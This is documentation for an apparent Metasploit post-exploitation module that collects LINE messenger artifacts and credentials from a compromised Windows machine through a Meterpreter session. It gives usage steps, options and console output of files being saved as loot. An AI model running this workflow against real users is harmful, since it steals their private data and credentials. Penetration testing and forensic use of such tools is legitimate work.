## Module Description

This post-exploitation module gathers artifacts found on LINE related folders from end users systems.

The list of available artifcts are listed within the module and can be added at anytime. Each artifacts are categorised so that users can specify a category to look for.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/line
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.

### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifcats/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by defalt and will perform the data extraction using the predefined regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Example Run
### Default Output
  ```
msf6 post(windows/gather/line) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Line's parent folder found
[*] Line's *.png file found
[*] Downloading C:\Users\IEUser\AppData\Local\LINE\Data\Sticker\10020\6\animation\24348280.png
[*] Line 24348280.png downloaded
[+] File saved to:  /root/.msf4/loot/20210513054823_default_192.168.56.106_line24348280.png_031858.png

[*] Downloading C:\Users\IEUser\AppData\Local\LINE\Data\Sticker\1005\7\16188.png
[*] Line 16188.png downloaded
[+] File saved to:  /root/.msf4/loot/20210513054824_default_192.168.56.106_line16188.png_166694.png

[*] Downloading C:\Users\IEUser\AppData\Local\LINE\Data\Sticker\2000000\3\47976.png
[*] Line 47976.png downloaded
[+] File saved to:  /root/.msf4/loot/20210513054824_default_192.168.56.106_line47976.png_270633.png

[*] PackRat credential sweep Completed
[*] Post module execution completed

  ```

### Verbose Output
  ```
msf6 post(windows/gather/line) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Line's parent folder found
[*] Line's *.png file found
[*] Downloading C:\Users\IEUser\AppData\Local\LINE\Data\Sticker\10020\6\animation\24348280.png
[*] Line 24348280.png downloaded
[+] File saved to:  /root/.msf4/loot/20210513055412_default_192.168.56.106_line24348280.png_472404.png

[*] Downloading C:\Users\IEUser\AppData\Local\LINE\Data\Sticker\1005\7\16188.png
[*] Line 16188.png downloaded
[+] File saved to:  /root/.msf4/loot/20210513055412_default_192.168.56.106_line16188.png_355604.png

[*] Downloading C:\Users\IEUser\AppData\Local\LINE\Data\Sticker\2000000\3\47976.png
[*] Line 47976.png downloaded
[+] File saved to:  /root/.msf4/loot/20210513055412_default_192.168.56.106_line47976.png_481503.png

[*] Downloading C:\Users\IEUser\AppData\Local\LINE\Data\Sticker\3059\1\765251.png
[*] Line 765251.png downloaded
[+] File saved to:  /root/.msf4/loot/20210513055413_default_192.168.56.106_line765251.png_881563.png

[*] Downloading C:\Users\IEUser\AppData\Local\LINE\Data\Sticker\3590\1\2872642.png
[*] Line 2872642.png downloaded
[+] File saved to:  /root/.msf4/loot/20210513055413_default_192.168.56.106_line2872642.png_628173.png


[-] This artifact does not support any extraction type
[*] PackRat credential sweep Completed
[*] Post module execution completed

```